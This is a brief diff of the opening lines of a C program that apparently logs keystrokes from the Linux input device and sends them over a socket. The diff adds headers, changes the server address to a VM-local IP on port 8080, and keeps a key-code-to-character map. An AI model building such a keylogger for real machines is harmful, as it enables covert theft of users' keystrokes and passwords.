@@ -2,12 +2,14 @@
 #include <stdio.h>
 #include <fcntl.h>
 #include <unistd.h>
+#include <strings.h>
 #include <sys/socket.h>
+#include <arpa/inet.h>
 #include <linux/input.h>
 #include <netdb.h>
 #define PORT 8080
 // Server address will depend on your VM
-#define ADDRESS "192.168.111.129"
+#define ADDRESS "10.0.2.15"
 #define SA struct sockaddr
 
 char *keys = "__1234567890-=__qwertyuiop[]__asdfghjkl;'___zxcvbnm,./";
